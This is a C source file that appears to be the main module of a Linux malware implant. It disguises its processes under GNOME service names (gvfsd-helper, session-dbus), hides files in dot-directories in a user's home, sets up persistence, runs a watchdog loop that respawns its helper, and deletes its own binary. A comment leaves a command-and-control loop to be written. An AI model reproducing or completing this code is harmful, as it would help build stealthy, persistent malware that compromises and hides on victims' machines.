#include <sys/shm.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <errno.h>
// custom functions
#include "utils.h"
#include "persistence.h"

int main(int argc, char *argv[]) {

    #ifdef DEBUG
    printf("DEBUG MODE ENABLED\n");
    #endif

    pid_t id = getuid();

    // TODO: *fpath = session_dbus_file_write

    // Spawn session-dbus (monitor)
    if (access("/home/gdev/.X11/X0-lock", F_OK) == 0) {

        // if pwd , spawn session-dbus
        if (get_pwd() == true) {
            if (id != 0 ) { // non-root
                //daemon(0, 0);
                spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
            }
            do {
            // forever run session-dbus as a "watchdog process".
            sleep(10);
            }while(true);
        }

    } else {
        #ifdef DEBUG
        fprintf(stderr, "First time running, creating locks!!");
        #endif
        create_lock();  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
    }

    bool desktop_res = nonroot_persistence();
    if (desktop_res == false ) {
        fprintf(stderr, "[main] Error creating non-root persistence: %s",strerror(errno));
        exit(1);
    }
    // if root do ....
    if (id == 0) {
        //daemon(0, 0);  // detach from current console
        // TODO - spawn root thread, and perform root operations

    } else { // non-root user....

        //daemon(0, 0);  // detach from current console
        // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
        printf("initial spawn of gvfsd-helper\n");
        spawn_thread_watchdog(0, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
        // Main C2 goes here?

    }

    #ifndef DEBUG
    self_delete(argv[0]); //  deleting this binary.
    #endif
    // TODO: main_c2_loop goes here (gvfsd-helper).
    return 0;
 }
